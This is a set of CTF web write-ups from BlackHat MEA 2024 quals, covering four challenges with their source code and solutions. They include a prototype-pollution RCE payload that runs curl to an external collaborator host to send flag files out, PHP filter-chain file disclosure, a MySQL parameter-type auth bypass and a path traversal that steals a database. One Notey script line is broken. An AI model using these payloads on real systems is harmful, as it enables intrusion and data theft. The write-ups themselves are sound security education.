<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-d4rktt
description: CTF writeups and security challenges by D4rkTT.
---

# Writeups by D4rkTT

Source repository: `/repos/D4rkTT`

## Repository Index

- BlackHat-MEA-2024-Quals-Writeups/Fastest Delivery Service.md
- BlackHat-MEA-2024-Quals-Writeups/Free flag.md
- BlackHat-MEA-2024-Quals-Writeups/Notey.md
- BlackHat-MEA-2024-Quals-Writeups/README.md
- BlackHat-MEA-2024-Quals-Writeups/Watermelon.md

## Writeup Content


### File: BlackHat-MEA-2024-Quals-Writeups/README.md

# BlackHat MEA 2024 Quals Writeups
Writeups for BlackHat MEA 2024 Quals

## Writeups:
- [Watermelon](Watermelon.md)
- [Free Flag](Free%20flag.md)
- [Notey](Notey.md)
- [Fastest Delivery Service](Fastest%20Delivery%20Service.md)



### File: BlackHat-MEA-2024-Quals-Writeups/Fastest Delivery Service.md


## Fastest Delivery Service Writeup

- **Category:** Web
- **Points:** 270
- **Difficulty:** Hard

## Challenge Description

No time for description, I had some orders to deliver : D 
Note: The code provided is without jailing, please note that when writing exploits.

## Challenge Code

```js
const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const crypto = require("crypto");

const app = express();
const PORT = 3000;

// In-memory data storage
let users = {};
let orders = {};
let addresses = {};

// Inserting admin user
users['admin'] = { password: crypto.randomBytes(16).toString('hex'), orders: [], address: '' };

// Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.set('view engine', 'ejs');
app.use(session({
    secret: crypto.randomBytes(16).toString('hex'),
    resave: false,
    saveUninitialized: true
}));

// Routes
app.get('/', (req, res) => {
    res.render('index', { user: req.session.user });
});
app.get('/login', (req, res) => {
    res.render('login');
});

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const user = users[username];

    if (user && user.password === password) {
        req.session.user = { username };
        res.redirect('/');
    } else {
        res.send('Invalid credentials. <a href="/login">Try again</a>.');
    }
});

app.get('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/');
});

app.get('/register', (req, res) => {
    res.render('register');
});

app.post('/register', (req, res) => {
    const { username, password } = req.body;

    if (Object.prototype.hasOwnProperty.call(users, username)) {
        res.send('Username already exists. <a href="/register">Try a different username</a>.');
    } else {
        users[username] = { password, orders: [], address: '' };
        req.session.user = { username };
        res.redirect(`/address`);
    }
});

app.get('/address', (req, res) => {
    const { user } = req.session;
    if (user && users[user.username]) {
        res.render('address', { username: user.username });
    } else {
        res.redirect('/register');
    }
});

app.post('/address', (req, res) => {
    const { user } = req.session;
    const { addressId, Fulladdress } = req.body;

    if (user && users[user.username]) {
        addresses[user.username][addressId] = Fulladdress;
        users[user.username].address = addressId;
        res.redirect('/login');
    } else {
        res.redirect('/register');
    }
});



app.get('/order', (req, res) => {
    if (req.session.user) {
        res.render('order');
    } else {
        res.redirect('/login');
    }
});

app.post('/order', (req, res) => {
    if (req.session.user) {
        const { item, quantity } = req.body;
        const orderId = `order-${Date.now()}`;
        orders[orderId] = { item, quantity, username: req.session.user.username };
        users[req.session.user.username].orders.push(orderId);
        res.redirect('/');
    } else {
        res.redirect('/login');
    }
});

app.get('/admin', (req, res) => {
    if (req.session.user && req.session.user.username === 'admin') {
        const allOrders = Object.keys(orders).map(orderId => ({
            ...orders[orderId],
            orderId
        }));
        res.render('admin', { orders: allOrders });
    } else {
        res.redirect('/');
    }
});


// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
```

## Analysis

After analyzing the code, I found that the flag is stored on the server in `/tmp/flag_{random_string}.txt` (according to the Dockerfile). Therefore, we need to get Remote Code Execution (RCE) to retrieve the flag. Upon further examination, I discovered a Server-Side Prototype Pollution vulnerability in the address addition function:
```js
app.post('/address', (req, res) => {
    const { user } = req.session;
    const { addressId, Fulladdress } = req.body;

    if (user && users[user.username]) {
        addresses[user.username][addressId] = Fulladdress;
        users[user.username].address = addressId;
        res.redirect('/login');
    } else {
        res.redirect('/register');
    }
});
```

Here, `addresses[user.username][addressId] = Fulladdress;` accepts two parameters from the request: addressId and Fulladdress. To exploit this Server-Side Prototype Pollution (SSPP), we need to control the user.username from the session. Since the application uses the ejs engine, we can achieve RCE if we can control `user.username`.

## Exploitation

I found that I can control user.username by registering a new user with the username `__proto__`. We can then add an address with addressId: `escapeFunction` and Fulladdress: `JSON.stringify; process.mainModule.require('child_process').exec('curl "http://id_here.oastify.com/$(cat /tmp/*.txt | base64 -w 0)"')`.

Next, add another new address with addressId: `client` and Fulladdress: `true`.

Finally, access the index `http://id_here.playat.flagyard.com/` or any page, and notice that the command has been executed, allowing us to retrieve the flag via Burp Collaborator.

Due to server restrictions that revoke sessions in less than 3 seconds, the exploit is automated using a script that registers a new user, logs in, and exploits the SSPP.

## Exploitation Script

```python
import requests

base_url = "http://ad8a40dc28e9f70f83bf8.playat.flagyard.com"
register_url = f"{base_url}/register"
address_url = f"{base_url}/address"

register_data = {
    "username": "__proto__",
    "password": "12345"
}

address_data1 = {
    "addressId": "  ",
    "Fulladdress": "JSON.stringify; process.mainModule.require('child_process').exec('curl \"http://id_here.oastify.com/$(cat /tmp/*.txt | base64 -w 0)\"')"
}

address_data2 = {
    "addressId": "client",
    "Fulladdress": "true"
}

sess = requests.Session()
register_response = sess.post(register_url, data=register_data)
print(f"Registration response: {register_response.status_code}")

address_response = sess.post(address_url, data=address_data1)
print(f"address_response 1 response: {address_response.status_code}")

address_response = sess.post(address_url, data=address_data2)
print(f"address_response 2 response: {address_response.status_code}")

sess.get(base_url)
```

## Flag

BHFlagY{76076bd96da5a2e24bd52ea1be660fe4}



### File: BlackHat-MEA-2024-Quals-Writeups/Free flag.md


## Free Flag Writeup

- **Category:** Web
- **Points:** 110
- **Difficulty:** Easy

## Challenge Description

Free Free

## Challenge Code

```php
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Flag</title>
</head>
<body>
    
<?php

function isRateLimited($limitTime = 1) {
    $ipAddress=$_SERVER['REMOTE_ADDR'];
    $filename = sys_get_temp_dir() . "/rate_limit_" . md5($ipAddress);
    $lastRequestTime = @file_get_contents($filename);
    
    if ($lastRequestTime !== false && (time() - $lastRequestTime) < $limitTime) {
        return true;
    }

    file_put_contents($filename, time());
    return false;
}

    if(isset($_POST['file']))
    {
        if(isRateLimited())
        {
            die("Limited 1 req per second");
        }
        $file = $_POST['file'];
        if(substr(file_get_contents($file),0,5) !== "<?php" && substr(file_get_contents($file),0,5) !== "<html") # i will let you only read my source haha
        {
            die("catched");
        }
        else
        {
            echo file_get_contents($file);
        }
    }

?>
</body>
</html>
```

## Exploitation

This challenge presents a Local File Disclosure (LFD) vulnerability, but it restricts the retrieval of files whose contents do start with `<?php` or `<html`. However, by using the wrapwarp script—a modified version of the PHP filter chain generator that supports adding a prefix and suffix—this restriction can be bypassed.

### Exploiting Local File Disclosure

By crafting a malicious payload using the wrapwarp tool, you can bypass the file content check. The following command generates the payload:

```cmd
python wrapwrap.py /flag.txt "<?php" "?>" 100
```

Once the payload is generated, it is sent via a POST request:

```http
POST / HTTP/1.1
Host: a78a1875e57a99f71f265.playat.flagyard.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 81703
Cookie: connect.sid=session;

file=php://filter/convert.base64-encode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-encode...
```

The payload allows the retrieval of the flag by embedding it between `<?php` and `?>`, effectively bypassing the file content check.

### Flag

`BHFlagY{1150be5e64bbcd3a2a2d2dfba76fe546}`



### File: BlackHat-MEA-2024-Quals-Writeups/Notey.md


## Notey Writeup

- **Category:** Web
- **Points:** 180
- **Difficulty:** Medium

## Challenge Description

I created a note sharing website for everyone to talk to themselves secretly. Don't try to access others notes, grass isn't greener :'( )

## Challenge Code

[Here](https://github.com/D4rkTT/BlackHat-MEA-2024-Quals-Writeups/tree/main/Notey-src)

## Exploitation

The application allows users to create and share notes by adding a secret password for the note so the user can share it using the note's ID and password. Upon analyzing the application, I found that the `viewNote` function does not validate the parameter types, allowing arrays to be sent instead of text. This can be exploited to retrieve the flag from the admin's note (ID 66).

The database is MySQL, so we can send the following request:
`viewNote?note_id=66&note_secret[username]=admin`

This results in the following query:
```sql
SELECT note_id, username, note FROM notes WHERE note_id = '66' AND secret = `username` = 'admin'
```

This is effectively equivalent to:
```sql
SELECT note_id,username,note FROM notes WHERE note_id = '66' and 1
```

The condition `secret = ``username`` = 'admin'` evaluates to `1` since there is a note in the table with `username='admin'`.


If there is no username field, the attack can still be executed by creating a new note with any content, such as 'test', and then retrieving the admin's note using:
`/viewNote?note_id=66&note_secret[note]=test`

Due to server restrictions that revoke sessions in less than 3 seconds, the exploit is automated using a script that registers a new user, logs in, and retrieves the flag.

```python
import requests

base_url = "http://a3a3b67b41f6f89581711.playat.flagyard.com"
login_url = f"{base_url}/login"
register_url = f"{base_url}/register"

username = "anyuser"
password = "1234567"

register_data = {
    "username": username,
    "password": password
}

sess = requests.Session()
register_response = sess.post(register_url, data=register_data)
login_response = sess.post(login_url, data=register_data)

target_url = f"{base_url}/viewNote?note_id=66&note_secret[username]=admin"

exp = sess.get(target_url)
flag = exp.json()[0]['note']
print(f"Flag: {}")
```



### File: BlackHat-MEA-2024-Quals-Writeups/Watermelon.md


## Watermelon Writeup

- **Category:** Web
- **Points:** 120
- **Difficulty:** Easy

## Challenge Description

All love for Watermelons 🍉🍉🍉

Note: The code provided is without jailing, please note that when writing exploits.

## Challenge Code

```python
from flask import Flask, request, jsonify, session, send_file
from functools import wraps
from flask_sqlalchemy import SQLAlchemy
import os, secrets
from werkzeug.utils import secure_filename



app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db.db' 
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = secrets.token_hex(20)
app.config['UPLOAD_FOLDER'] = 'files'


db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(120), nullable=False)

class File(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    filename = db.Column(db.String(255), nullable=False)
    filepath = db.Column(db.String(255), nullable=False)
    uploaded_at = db.Column(db.DateTime, nullable=False, default=db.func.current_timestamp())
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)

    user = db.relationship('User', backref=db.backref('files', lazy=True))


def create_admin_user():
    admin_user = User.query.filter_by(username='admin').first()
    if not admin_user:
        admin_user = User(username='admin', password= secrets.token_hex(20))
        db.session.add(admin_user)
        db.session.commit()
        print("Admin user created.")
    else:
        print("Admin user already exists.")

with app.app_context():
    db.create_all()
    create_admin_user()

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'username' not in session or 'user_id' not in session:
            return jsonify({"Error": "Unauthorized access"}), 401
        return f(*args, **kwargs)
    return decorated_function


def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'username' not in session or 'user_id' not in session or not session['username']=='admin':
            return jsonify({"Error": "Unauthorized access"}), 401
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
def index():
    return 'Welcome to my file sharing API'

@app.post("/register")
def register():
    if not request.json or not "username" in request.json or not "password" in request.json:
        return jsonify({"Error": "Please fill all fields"}), 400
    
    username = request.json['username']
    password = request.json['password']

    if User.query.filter_by(username=username).first():
        return jsonify({"Error": "Username already exists"}), 409

    new_user = User(username=username, password=password)
    db.session.add(new_user)
    db.session.commit()

    return jsonify({"Message": "User registered successfully"}), 201

@app.post("/login")
def login():
    if not request.json or not "username" in request.json or not "password" in request.json:
        return jsonify({"Error": "Please fill all fields"}), 400
    
    username = request.json['username']
    password = request.json['password']

    user = User.query.filter_by(username=username, password=password).first()
    if not user:
        return jsonify({"Error": "Invalid username or password"}), 401
    
    session['user_id'] = user.id
    session['username'] = user.username
    return jsonify({"Message": "Login successful"}), 200

@app.get('/profile')
@login_required
def profile():
    return jsonify({"username": session['username'], "user_id": session['user_id']})

@app.get('/files')
@login_required
def list_files():
    user_id = session.get('user_id')
    files = File.query.filter_by(user_id=user_id).all()
    file_list = [{"id": file.id, "filename": file.filename, "filepath": file.filepath, "uploaded_at": file.uploaded_at} for file in files]
    return jsonify({"files": file_list}), 200


@app.route("/upload", methods=["POST"])
@login_required
def upload_file():
    if 'file' not in request.files:
        return jsonify({"Error": "No file part"}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"Error": "No selected file"}), 400
    
    user_id = session.get('user_id')
    if file:
        blocked = ["proc", "self", "environ", "env"]
        filename = file.filename

        if filename in blocked:
            return jsonify({"Error":"Why?"})

        user_dir = os.path.join(app.config['UPLOAD_FOLDER'], str(user_id))
        os.makedirs(user_dir, exist_ok=True)
        

        file_path = os.path.join(user_dir, filename)

        file.save(f"{user_dir}/{secure_filename(filename)}")
        

        new_file = File(filename=secure_filename(filename), filepath=file_path, user_id=user_id)
        db.session.add(new_file)
        db.session.commit()
        
        return jsonify({"Message": "File uploaded successfully", "file_path": file_path}), 201

    return jsonify({"Error": "File upload failed"}), 500

@app.route("/file/<int:file_id>", methods=["GET"])
@login_required  
def view_file(file_id):
    user_id = session.get('user_id')
    file = File.query.filter_by(id=file_id, user_id=user_id).first()

    if file is None:
        return jsonify({"Error": "File not found or unauthorized access"}), 404
    
    try:
        return send_file(file.filepath, as_attachment=True)
    except Exception as e:
        return jsonify({"Error": str(e)}), 500


@app.get('/admin')
@admin_required
def admin():
    return os.getenv("FLAG","BHFlagY{testing_flag}")



if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

## Exploitation

To solve the challenge, the goal was to access the `/admin` route to retrieve the flag, which is stored in the environment variables. Initially, I considered creating a new admin user via SQL Truncation, but this approach was not viable. Upon further inspection of the code, I identified the upload and download functionalities as potential vectors for exploitation.

### Upload Function

The upload functionality is defined as follows:

```python
@app.route("/upload", methods=["POST"])
@login_required
def upload_file():
    if 'file' not in request.files:
        return jsonify({"Error": "No file part"}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"Error": "No selected file"}), 400
    
    user_id = session.get('user_id')
    if file:
        blocked = ["proc", "self", "environ", "env"]
        filename = file.filename

        if filename in blocked:
            return jsonify({"Error":"Why?"})

        user_dir = os.path.join(app.config['UPLOAD_FOLDER'], str(user_id))
        os.makedirs(user_dir, exist_ok=True)
        

        file_path = os.path.join(user_dir, filename)

        file.save(f"{user_dir}/{secure_filename(filename)}")
        

        new_file = File(filename=secure_filename(filename), filepath=file_path, user_id=user_id)
        db.session.add(new_file)
        db.session.commit()
        
        return jsonify({"Message": "File uploaded successfully", "file_path": file_path}), 201

    return jsonify({"Error": "File upload failed"}), 500
```

This function securely handles file uploads, using `secure_filename` to prevent Path Traversal attacks. Additionally, it implements a blacklist filter to block the upload of certain files like `proc`, `self`, `environ`, etc. The function also stores the filename and filepath in the database, which are later used in the download function.

### Download Function

The download functionality is defined as follows:

```python
@app.route("/file/<int:file_id>", methods=["GET"])
@login_required  
def view_file(file_id):
    user_id = session.get('user_id')
    file = File.query.filter_by(id=file_id, user_id=user_id).first()

    if file is None:
        return jsonify({"Error": "File not found or unauthorized access"}), 404
    
    try:
        return send_file(file.filepath, as_attachment=True)
    except Exception as e:
        return jsonify({"Error": str(e)}), 500
```

This function retrieves the `file_id` from the database and sends the corresponding file to the user. Given the lack of filtering in `filepath`, this can be exploited using a Path Traversal attack.

### Exploiting Path Traversal

By crafting a malicious filename during the upload process, such as `../../../../proc/self/environ`, I attempted to access sensitive files. However, the application lacked the necessary permissions to read `/proc/self/environ`. 

Instead, I targeted the SQLite database file. The database is stored in the application directory under `app/instance/db.db`. By uploading a file with the name `../../instance/db.db`, I could then download the file by its `file_id` from the `/files` endpoint.

Here’s the HTTP request used to upload the file:

```http
POST /upload HTTP/1.1
Host: aa467d5511d4387194c9b.playat.flagyard.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPhaNboqLP6mrBESI
Content-Length: 285
Cookie: session=session_here;

------WebKitFormBoundaryPhaNboqLP6mrBESI
Content-Disposition: form-data; name="file"; filename="../../instance/db.db"
Content-Type: text/plain


------WebKitFormBoundaryPhaNboqLP6mrBESI
Content-Disposition: form-data; name="submit"


------WebKitFormBoundaryPhaNboqLP6mrBESI--
```

After retrieving the database file, I was able to extract the admin password. Logging in as the admin, I successfully accessed the `/admin` route and obtained the flag.

### Flag

`BHFlagY{950acae9afadff10f179a23aea8d9517}`

